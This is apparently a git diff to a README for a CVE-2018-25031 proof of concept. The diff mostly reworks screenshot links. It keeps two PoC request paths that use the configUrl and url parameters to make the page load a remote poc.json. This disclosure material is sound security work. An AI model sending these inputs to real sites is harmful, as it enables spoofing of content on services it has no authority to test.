@@ -16,13 +16,13 @@
 <br/>   
  
 ### Screenshot before attack:
-<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />
-
-### Screenshot after attack:
-<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />
+<[img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />](https://github.com/Raptiler/test/blob/main/1.png?raw=true)
 
 ### PoC:
 ```
 /index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
 /index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
 ```
+
+### PoC Screenshot after attack:
+[<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />](https://github.com/Raptiler/test/blob/main/2.png?raw=true)
